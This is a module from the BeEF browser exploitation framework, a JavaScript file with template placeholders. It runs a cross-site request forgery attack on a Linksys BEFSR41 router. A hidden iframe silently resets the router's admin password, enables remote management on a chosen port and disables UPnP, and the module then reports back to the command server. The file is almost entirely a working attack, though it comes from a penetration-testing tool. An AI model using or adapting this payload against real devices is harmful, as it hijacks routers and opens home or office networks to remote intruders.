//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

  var befsr41_iframe = beef.dom.createInvisibleIframe();
  befsr41_iframe.setAttribute('src', '<%= @base %>Gozila.cgi?PasswdModify=1&sysPasswd=<%= @password %>&sysPasswdConfirm=<%= @password %>&Remote_Upgrade=1&Remote_Management=1&RemotePort=<%= @port %>&UPnP_Work=0');
  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");

  cleanup = function() {
    document.body.removeChild(befsr41_iframe);
  }
  setTimeout("cleanup()", 15000);

});

